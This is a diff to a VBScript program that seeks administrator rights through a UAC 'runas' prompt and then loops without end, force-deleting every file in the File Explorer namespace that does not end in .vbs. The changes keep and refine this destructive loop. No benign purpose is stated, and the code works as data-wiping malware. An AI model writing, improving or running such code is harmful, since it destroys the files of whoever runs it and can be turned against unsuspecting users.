@@ -1,9 +1,9 @@
-Set objShell = CreateObject("WScript.Shell")
+Set objShell = CreateObject("Shell.Application")
 
 ' Check if the script is already running with administrator privileges
-If Not objShell.Run("cmd /k cd %windir% & whoami /groups | findstr /b /c:""Mandatory Label\High Mandatory Level""") = 0 Then
+If Not objShell.AppActivate("Administrator: Command Prompt") Then
     ' If not running with administrator privileges, prompt to run as administrator
-    objShell.Run "cmd /k cd %windir% & net session >nul 2>&1 || (echo Set UAC = CreateObject^(""Shell.Application""^) : UAC.ShellExecute ""wscript.exe"", """ & WScript.ScriptFullName & """, """", ""runas"", 1 : Set UAC = Nothing : exit"") & exit", 1, True
+    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
     WScript.Quit
 End If
 
@@ -42,17 +42,14 @@ Do While True
         End If
     Next
 
-    ' Loop through the file explorer and delete non-vbs files
-    strExplorerPath = objShell.Namespace(0).Self.Path
-    Set objExplorerFolder = objFSO.GetFolder(strExplorerPath)
-    For Each objSubFolder In objExplorerFolder.SubFolders
-        For Each objFile In objSubFolder.Files
-            If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
-                objFSO.DeleteFile objFile.Path, True
-            End If
-        Next
+    ' Loop through the File Explorer and delete non-vbs files
+    Set objExplorerFolder = objShell.NameSpace(0)
+    For Each objFile In objExplorerFolder.Items
+        If objFSO.GetExtensionName(objFile.Path) <> "vbs" Then
+            objFSO.DeleteFile objFile.Path, True
+        End If
     Next
-    
+
     ' Wait for a certain amount of time before looping again
-    WScript.Sleep 0
+    WScript.Sleep 10000 ' Wait for 10 seconds before looping again
 Loop
